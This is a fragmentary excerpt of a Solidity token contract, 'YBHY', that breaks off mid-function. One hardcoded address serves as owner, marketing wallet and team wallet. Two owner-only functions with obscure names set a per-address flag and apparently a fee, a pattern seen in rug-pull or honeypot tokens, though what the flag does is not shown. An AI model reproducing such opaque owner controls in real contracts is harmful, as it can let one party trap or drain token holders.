...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x3668d72cd91670F1Ad94051C8878d90A1519E78c;
        // owner address
...
contract YBHY is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "YangBingHappy";
    string private _symbol = "YBHY";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x3668d72cd91670F1Ad94051C8878d90A1519E78c); // Marketing Address
    address payable public teamWalletAddress = payable(0x3668d72cd91670F1Ad94051C8878d90A1519E78c); // Team Address
    ...
    function setDLYBHY(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEYBHY(uint256 fe) external onlyOwner {
